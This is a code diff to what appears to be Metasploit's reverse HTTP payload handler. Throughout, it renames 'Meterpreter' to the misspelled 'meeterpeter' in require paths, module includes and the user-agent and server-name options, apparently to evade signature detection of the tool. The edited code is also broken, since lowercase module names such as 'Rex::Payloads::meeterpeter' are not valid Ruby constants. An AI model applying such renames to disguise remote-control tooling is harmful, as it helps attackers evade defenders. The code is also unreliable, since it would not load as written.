@@ -1,8 +1,8 @@
 # -*- coding: binary -*-
 require 'rex/io/stream_abstraction'
 require 'rex/sync/ref'
-require 'rex/payloads/meterpreter/uri_checksum'
-require 'rex/post/meterpreter/packet'
+require 'rex/payloads/meeterpeter/uri_checksum'
+require 'rex/post/meeterpeter/packet'
 require 'rex/parser/x509_certificate'
 require 'msf/core/payload/windows/verify_ssl'
 
@@ -17,9 +17,9 @@ module Handler
 module ReverseHttp
 
   include Msf::Handler
-  include Rex::Payloads::Meterpreter::UriChecksum
+  include Rex::Payloads::meeterpeter::UriChecksum
   include Msf::Payload::Windows::VerifySsl
-  include Rex::Post::Meterpreter
+  include Rex::Post::meeterpeter
 
   #
   # Returns the string representation of the handler type
@@ -51,8 +51,8 @@ module ReverseHttp
     register_advanced_options(
       [
         OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),
-        OptString.new('MeterpreterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
-        OptString.new('MeterpreterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ]),
+        OptString.new('meeterpeterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
+        OptString.new('meeterpeterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ]),
         OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
         OptInt.new('ReverseListenerBindPort', [ false, 'The port to bind to on the local system if different from LPORT' ]),
         OptBool.new('OverrideRequestHost', [ false, 'Forces clients to connect to LHOST:LPORT instead of keeping original payload host', false ]),
@@ -140,7 +140,7 @@ module ReverseHttp
       (ssl?) ? datastore["HandlerSSLCert"] : nil
     )
 
-    self.service.server_name = datastore['MeterpreterServerName']
+    self.service.server_name = datastore['meeterpeterServerName']
 
     # Create a reference to ourselves
     obj = self
@@ -287,7 +287,7 @@ protected
         blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
         blob.sub!('HTTP_EXPIRATION_TIMEOUT = 604800', "HTTP_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
         blob.sub!('HTTP_COMMUNICATION_TIMEOUT = 300', "HTTP_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
-        blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")
+        blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['meeterpeterUserAgent'])}'")
 
         unless datastore['PayloadProxyHost'].blank?
           proxy_url = "http://#{datastore['PayloadProxyHost']||datastore['PROXYHOST']}:#{datastore['PayloadProxyPort']||datastore['PROXYPORT']}"
